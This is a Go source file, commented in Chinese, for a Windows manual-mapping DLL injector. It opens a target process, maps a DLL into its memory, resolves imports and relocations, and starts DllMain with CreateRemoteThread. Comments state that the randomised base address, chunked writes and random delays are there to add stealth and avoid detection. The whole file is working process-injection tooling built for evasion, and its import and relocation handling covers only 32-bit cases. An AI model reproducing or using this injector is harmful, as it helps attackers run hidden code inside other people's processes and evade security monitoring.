package loader

import (
	"encoding/binary"
	"fmt"
	"math/rand"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 内存保护常量
const (
	PAGE_NOACCESS          = 0x01
	PAGE_READONLY          = 0x02
	PAGE_READWRITE         = 0x04
	PAGE_WRITECOPY         = 0x08
	PAGE_EXECUTE           = 0x10
	PAGE_EXECUTE_READ      = 0x20
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_WRITECOPY = 0x80

	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
	MEM_RELEASE = 0x8000

	PROCESS_ALL_ACCESS = 0x1F0FFF

	IMAGE_SCN_MEM_EXECUTE = 0x20000000
	IMAGE_SCN_MEM_READ    = 0x40000000
	IMAGE_SCN_MEM_WRITE   = 0x80000000

	DLL_PROCESS_ATTACH = 1
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")

	procVirtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	procVirtualProtectEx   = kernel32.NewProc("VirtualProtectEx")
	procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
	procGetProcAddress     = kernel32.NewProc("GetProcAddress")
	procLoadLibraryA       = kernel32.NewProc("LoadLibraryA")
	procGetModuleHandleA   = kernel32.NewProc("GetModuleHandleA")
)

// ManualMapper 手动映射注入器
type ManualMapper struct {
	targetPID  uint32
	dllData    []byte
	peInfo     *PEInfo
	hProcess   windows.Handle
	remoteBase uintptr
}

// NewManualMapper 创建手动映射注入器
func NewManualMapper(pid uint32, dllData []byte) (*ManualMapper, error) {
	// 解析PE
	parser := NewPEParser(dllData)
	peInfo, err := parser.Parse()
	if err != nil {
		return nil, fmt.Errorf("PE解析失败: %v", err)
	}

	return &ManualMapper{
		targetPID: pid,
		dllData:   dllData,
		peInfo:    peInfo,
	}, nil
}

// Inject 执行注入
func (m *ManualMapper) Inject() (uintptr, error) {
	// 1. 打开目标进程
	if err := m.openProcess(); err != nil {
		return 0, err
	}
	defer m.closeProcess()

	// 2. 分配远程内存
	if err := m.allocateMemory(); err != nil {
		return 0, err
	}

	// 3. 映射PE头和节
	if err := m.mapSections(); err != nil {
		return 0, err
	}

	// 4. 修复导入表
	if err := m.fixImportTable(); err != nil {
		return 0, err
	}

	// 5. 处理重定位
	if err := m.processRelocations(); err != nil {
		return 0, err
	}

	// 6. 修改内存保护属性
	if err := m.protectSections(); err != nil {
		return 0, err
	}

	// 7. 调用DllMain
	if err := m.callDllMain(); err != nil {
		return 0, err
	}

	return m.remoteBase, nil
}

// openProcess 打开目标进程
func (m *ManualMapper) openProcess() error {
	handle, err := windows.OpenProcess(PROCESS_ALL_ACCESS, false, m.targetPID)
	if err != nil {
		return fmt.Errorf("打开进程失败 (PID=%d): %v", m.targetPID, err)
	}
	m.hProcess = handle
	return nil
}

// closeProcess 关闭进程句柄
func (m *ManualMapper) closeProcess() {
	if m.hProcess != 0 {
		windows.CloseHandle(m.hProcess)
	}
}

// allocateMemory 分配远程内存
func (m *ManualMapper) allocateMemory() error {
	// 使用随机基址增加隐蔽性
	rand.Seed(time.Now().UnixNano())
	preferredBase := uintptr(0x10000000 + rand.Intn(0x40000000))

	// 尝试在首选基址分配,如果失败则让系统选择
	ret, _, _ := procVirtualAllocEx.Call(
		uintptr(m.hProcess),
		preferredBase,
		uintptr(m.peInfo.SizeOfImage),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE,
	)

	if ret == 0 {
		// 首选地址失败,让系统选择
		ret, _, _ = procVirtualAllocEx.Call(
			uintptr(m.hProcess),
			0,
			uintptr(m.peInfo.SizeOfImage),
			MEM_COMMIT|MEM_RESERVE,
			PAGE_READWRITE,
		)
	}

	if ret == 0 {
		return fmt.Errorf("远程内存分配失败")
	}

	m.remoteBase = ret
	return nil
}

// mapSections 映射PE节
func (m *ManualMapper) mapSections() error {
	// 写入PE头
	if err := m.writeMemory(m.remoteBase, m.dllData[:m.peInfo.SizeOfHeaders]); err != nil {
		return fmt.Errorf("写入PE头失败: %v", err)
	}

	// 分段写入各个节,增加隐蔽性
	for _, section := range m.peInfo.Sections {
		if len(section.Data) == 0 {
			continue
		}

		destAddr := m.remoteBase + uintptr(section.VirtualAddress)

		// 分块写入避免大块内存操作被检测
		chunkSize := 4096
		for offset := 0; offset < len(section.Data); offset += chunkSize {
			end := offset + chunkSize
			if end > len(section.Data) {
				end = len(section.Data)
			}

			chunk := section.Data[offset:end]
			if err := m.writeMemory(destAddr+uintptr(offset), chunk); err != nil {
				return fmt.Errorf("写入节 %s 失败: %v", section.Name, err)
			}

			// 随机延迟1-5ms,模拟正常内存操作
			time.Sleep(time.Duration(1+rand.Intn(5)) * time.Millisecond)
		}
	}

	return nil
}

// fixImportTable 修复导入表
func (m *ManualMapper) fixImportTable() error {
	if m.peInfo.ImportDirectory == nil || m.peInfo.ImportDirectory.VirtualAddress == 0 {
		return nil // 没有导入表
	}

	// 读取本地数据以便解析
	importDescOffset := m.peInfo.ImportDirectory.VirtualAddress

	for {
		// 读取导入描述符
		var importDesc ImageImportDescriptor
		descData := m.dllData[importDescOffset : importDescOffset+uint32(unsafe.Sizeof(importDesc))]
		importDesc = *(*ImageImportDescriptor)(unsafe.Pointer(&descData[0]))

		// 检查是否结束
		if importDesc.Name == 0 {
			break
		}

		// 获取DLL名称
		dllNameRVA := importDesc.Name
		dllName := m.readStringFromData(dllNameRVA)

		// 在本地加载DLL获取函数地址
		hModule, err := m.loadLibraryLocal(dllName)
		if err != nil {
			return fmt.Errorf("加载依赖DLL %s 失败: %v", dllName, err)
		}

		// 修复IAT
		thunkRVA := importDesc.FirstThunk
		if importDesc.OriginalFirstThunk != 0 {
			thunkRVA = importDesc.OriginalFirstThunk
		}

		iatRVA := importDesc.FirstThunk

		for {
			// 读取Thunk
			thunkData := m.dllData[thunkRVA : thunkRVA+4]
			thunkValue := binary.LittleEndian.Uint32(thunkData)

			if thunkValue == 0 {
				break
			}

			var funcAddr uintptr

			// 检查是否按序号导入
			if thunkValue&0x80000000 != 0 {
				// 按序号导入
				ordinal := thunkValue & 0xFFFF
				funcAddr, err = m.getProcAddressByOrdinal(hModule, uint16(ordinal))
			} else {
				// 按名称导入
				nameRVA := thunkValue + 2 // 跳过hint
				funcName := m.readStringFromData(nameRVA)
				funcAddr, err = m.getProcAddress(hModule, funcName)
			}

			if err != nil {
				return fmt.Errorf("获取函数地址失败: %v", err)
			}

			// 写入IAT
			iatAddr := m.remoteBase + uintptr(iatRVA)
			funcAddrBytes := make([]byte, 4)
			binary.LittleEndian.PutUint32(funcAddrBytes, uint32(funcAddr))
			if err := m.writeMemory(iatAddr, funcAddrBytes); err != nil {
				return fmt.Errorf("写入IAT失败: %v", err)
			}

			thunkRVA += 4
			iatRVA += 4
		}

		importDescOffset += uint32(unsafe.Sizeof(importDesc))
	}

	return nil
}

// processRelocations 处理重定位
func (m *ManualMapper) processRelocations() error {
	if m.peInfo.RelocDirectory == nil || m.peInfo.RelocDirectory.VirtualAddress == 0 {
		return nil // 没有重定位表
	}

	// 计算偏移量
	delta := int64(m.remoteBase) - int64(m.peInfo.ImageBase)
	if delta == 0 {
		return nil // 加载在首选基址,无需重定位
	}

	relocRVA := m.peInfo.RelocDirectory.VirtualAddress
	relocEnd := relocRVA + m.peInfo.RelocDirectory.Size

	for relocRVA < relocEnd {
		// 读取重定位块头
		var relocBlock ImageBaseRelocation
		blockData := m.dllData[relocRVA : relocRVA+8]
		relocBlock = *(*ImageBaseRelocation)(unsafe.Pointer(&blockData[0]))

		if relocBlock.SizeOfBlock == 0 {
			break
		}

		// 处理每个重定位项
		entryCount := (relocBlock.SizeOfBlock - 8) / 2
		for i := uint32(0); i < entryCount; i++ {
			entryOffset := relocRVA + 8 + i*2
			entryData := binary.LittleEndian.Uint16(m.dllData[entryOffset : entryOffset+2])

			relocType := entryData >> 12
			offset := entryData & 0x0FFF

			if relocType == 0 { // IMAGE_REL_BASED_ABSOLUTE
				continue
			}

			if relocType == 3 { // IMAGE_REL_BASED_HIGHLOW (32位)
				targetRVA := relocBlock.VirtualAddress + uint32(offset)

				// 读取原始值
				originalData := m.dllData[targetRVA : targetRVA+4]
				originalValue := binary.LittleEndian.Uint32(originalData)

				// 计算新值
				newValue := uint32(int64(originalValue) + delta)

				// 写入新值
				newValueBytes := make([]byte, 4)
				binary.LittleEndian.PutUint32(newValueBytes, newValue)

				targetAddr := m.remoteBase + uintptr(targetRVA)
				if err := m.writeMemory(targetAddr, newValueBytes); err != nil {
					return fmt.Errorf("重定位失败: %v", err)
				}
			}
		}

		relocRVA += relocBlock.SizeOfBlock
	}

	return nil
}

// protectSections 设置节的内存保护属性
func (m *ManualMapper) protectSections() error {
	for _, section := range m.peInfo.Sections {
		if section.VirtualSize == 0 {
			continue
		}

		protection := m.sectionToProtection(section.Characteristics)
		addr := m.remoteBase + uintptr(section.VirtualAddress)
		size := uintptr(section.VirtualSize)

		var oldProtect uint32
		ret, _, _ := procVirtualProtectEx.Call(
			uintptr(m.hProcess),
			addr,
			size,
			uintptr(protection),
			uintptr(unsafe.Pointer(&oldProtect)),
		)

		if ret == 0 {
			return fmt.Errorf("设置节 %s 内存保护失败", section.Name)
		}
	}

	return nil
}

// sectionToProtection 将节特征转换为内存保护属性
func (m *ManualMapper) sectionToProtection(characteristics uint32) uint32 {
	executable := characteristics&IMAGE_SCN_MEM_EXECUTE != 0
	readable := characteristics&IMAGE_SCN_MEM_READ != 0
	writable := characteristics&IMAGE_SCN_MEM_WRITE != 0

	if executable {
		if writable {
			return PAGE_EXECUTE_READWRITE
		}
		if readable {
			return PAGE_EXECUTE_READ
		}
		return PAGE_EXECUTE
	}

	if writable {
		return PAGE_READWRITE
	}
	if readable {
		return PAGE_READONLY
	}

	return PAGE_NOACCESS
}

// callDllMain 调用DllMain
func (m *ManualMapper) callDllMain() error {
	if m.peInfo.EntryPoint == 0 {
		return nil // 没有入口点
	}

	entryAddr := m.remoteBase + uintptr(m.peInfo.EntryPoint)

	// 创建远程线程执行DllMain
	threadHandle, _, _ := procCreateRemoteThread.Call(
		uintptr(m.hProcess),
		0,
		0,
		entryAddr,
		m.remoteBase, // DLL base as parameter
		0,
		0,
	)

	if threadHandle == 0 {
		return fmt.Errorf("创建远程线程失败")
	}

	// 等待线程完成
	windows.WaitForSingleObject(windows.Handle(threadHandle), windows.INFINITE)
	windows.CloseHandle(windows.Handle(threadHandle))

	return nil
}

// writeMemory 写入远程进程内存
func (m *ManualMapper) writeMemory(addr uintptr, data []byte) error {
	var written uintptr
	ret, _, _ := procWriteProcessMemory.Call(
		uintptr(m.hProcess),
		addr,
		uintptr(unsafe.Pointer(&data[0])),
		uintptr(len(data)),
		uintptr(unsafe.Pointer(&written)),
	)

	if ret == 0 || written != uintptr(len(data)) {
		return fmt.Errorf("写入内存失败")
	}

	return nil
}

// readStringFromData 从DLL数据中读取字符串
func (m *ManualMapper) readStringFromData(rva uint32) string {
	var result []byte
	for i := rva; i < uint32(len(m.dllData)); i++ {
		if m.dllData[i] == 0 {
			break
		}
		result = append(result, m.dllData[i])
	}
	return string(result)
}

// loadLibraryLocal 在本地加载DLL
func (m *ManualMapper) loadLibraryLocal(dllName string) (syscall.Handle, error) {
	dllNameBytes, err := syscall.BytePtrFromString(dllName)
	if err != nil {
		return 0, err
	}

	ret, _, _ := procLoadLibraryA.Call(uintptr(unsafe.Pointer(dllNameBytes)))
	if ret == 0 {
		return 0, fmt.Errorf("LoadLibrary失败: %s", dllName)
	}

	return syscall.Handle(ret), nil
}

// getProcAddress 获取函数地址
func (m *ManualMapper) getProcAddress(hModule syscall.Handle, funcName string) (uintptr, error) {
	funcNameBytes, err := syscall.BytePtrFromString(funcName)
	if err != nil {
		return 0, err
	}

	ret, _, _ := procGetProcAddress.Call(uintptr(hModule), uintptr(unsafe.Pointer(funcNameBytes)))
	if ret == 0 {
		return 0, fmt.Errorf("GetProcAddress失败: %s", funcName)
	}

	return ret, nil
}

// getProcAddressByOrdinal 按序号获取函数地址
func (m *ManualMapper) getProcAddressByOrdinal(hModule syscall.Handle, ordinal uint16) (uintptr, error) {
	ret, _, _ := procGetProcAddress.Call(uintptr(hModule), uintptr(ordinal))
	if ret == 0 {
		return 0, fmt.Errorf("GetProcAddress失败 (序号=%d)", ordinal)
	}

	return ret, nil
}
